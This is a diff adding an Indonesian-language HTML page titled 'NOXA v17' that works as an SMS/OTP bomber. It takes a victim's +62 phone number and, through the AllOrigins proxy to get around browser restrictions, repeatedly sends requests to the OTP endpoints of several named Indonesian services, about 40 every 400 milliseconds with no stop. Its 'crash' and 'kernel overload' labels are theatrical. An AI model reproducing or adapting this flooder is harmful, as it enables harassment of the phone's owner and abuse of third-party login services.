@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NOXA v17 - ABSOLUTE ZERO</title>
+    <style>
+        :root { --danger: #ff0000; --neon: #00f2ff; --bg: #050505; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .main-box { width: 100%; max-width: 500px; background: #111; border: 2px solid var(--danger); border-radius: 20px; padding: 30px; box-shadow: 0 0 50px rgba(255,0,0,0.2); }
+        h1 { text-align: center; color: var(--danger); letter-spacing: 5px; margin-bottom: 5px; font-weight: 900; }
+        .sub-status { text-align: center; font-size: 0.7em; color: var(--neon); margin-bottom: 25px; border: 1px solid var(--neon); padding: 5px; border-radius: 5px; }
+        input { width: 100%; background: #000; border: 1px solid #333; padding: 18px; color: var(--neon); font-size: 1.2em; text-align: center; border-radius: 12px; outline: none; margin-bottom: 20px; box-sizing: border-box; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .btn-opt { background: #1a1a1a; border: 1px solid #444; color: #888; padding: 15px; border-radius: 10px; font-size: 0.75em; cursor: pointer; transition: 0.3s; font-weight: bold; }
+        .btn-opt.active { border-color: var(--danger); color: #fff; background: rgba(255,0,0,0.1); box-shadow: 0 0 15px rgba(255,0,0,0.2); }
+        .fire-btn { width: 100%; padding: 20px; background: var(--danger); color: #fff; border: none; border-radius: 15px; font-size: 1.2em; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; box-shadow: 0 5px 20px rgba(255,0,0,0.4); }
+        #log-area { margin-top: 25px; background: #000; border: 1px solid #222; height: 180px; overflow-y: scroll; padding: 15px; font-family: 'Courier New', Courier, monospace; font-size: 0.75em; color: #00ff00; border-radius: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="main-box">
+    <h1>NOXA v17</h1>
+    <div class="sub-status">GHOST IDENTITY: ACTIVE // BYPASS_MODE: ENABLED</div>
+
+    <input type="number" id="targetNo" placeholder="TARGET (Contoh: 62812xxx)">
+
+    <div class="grid">
+        <button class="btn-opt" id="b1" onclick="st('b1', 'WA_CRASH')">DATABASE_STRESS</button>
+        <button class="btn-opt" id="b2" onclick="st('b2', 'GHOST')">GHOST_TUNNEL</button>
+        <button class="btn-opt" id="b3" onclick="st('b3', 'KERNEL')">KERNEL_OVERLOAD</button>
+        <button class="btn-opt" id="b4" onclick="st('b4', 'BLITZ')">60S_ANNIHILATION</button>
+    </div>
+
+    <button class="fire-btn" onclick="start()">INITIATE ATTACK</button>
+
+    <div id="log-area">> System initialized. Ready to engage.</div>
+</div>
+
+<script>
+    let mods = [];
+    function st(id, m) {
+        const e = document.getElementById(id);
+        if(mods.includes(m)) { mods = mods.filter(x => x !== m); e.classList.remove('active'); }
+        else { mods.push(m); e.classList.add('active'); }
+    }
+
+    function addLog(m, c = "") {
+        const l = document.getElementById('log-area');
+        l.innerHTML += `<br>[${new Date().toLocaleTimeString()}] > <span style="color:${c}">${m}</span>`;
+        l.scrollTop = l.scrollHeight;
+    }
+
+    async function start() {
+        const n = document.getElementById('targetNo').value;
+        if(!n || mods.length === 0) return alert("Pilih Nomor dan Modul!");
+        if(!n.startsWith('62')) return alert("Gunakan format 62 (Contoh: 6285xxx)");
+
+        addLog("ESTABLISHING ENCRYPTED TUNNEL...", "#00f2ff");
+        addLog(`TARGET LOCKED: +${n}`, "yellow");
+
+        // NEW ENGINE: XHR PARALLEL FLOODING
+        setInterval(() => {
+            const apiList = [
+                'https://api.evermos.com/api/v1/auth/otp?phone=',
+                'https://api.mapclub.com/v1/auth/otp?phone=',
+                'https://id.bookmyshow.com/api/v1/auth/generate-otp?phone=',
+                'https://m.redbus.id/api/getOtp?phone='
+            ];
+
+            // Mengirim 40 paket per siklus (Total Power)
+            for(let i=0; i<40; i++) {
+                const api = apiList[Math.floor(Math.random() * apiList.length)];
+                // Menggunakan proxy bypass AllOrigins
+                const xhr = new XMLHttpRequest();
+                xhr.open("GET", `https://api.allorigins.win/get?url=${encodeURIComponent(api + n)}&cb=${Math.random()}`, true);
+                xhr.send();
+            }
+            addLog("BLAST: 40 Packets Injected. Target System Stressed.", "#ff0000");
+        }, 400);
+
+        addLog("CRASH SEQUENCE ACTIVE. ESTIMATED IMPACT: 60 SECONDS.", "orange");
+    }
+</script>
+</body>
+</html>
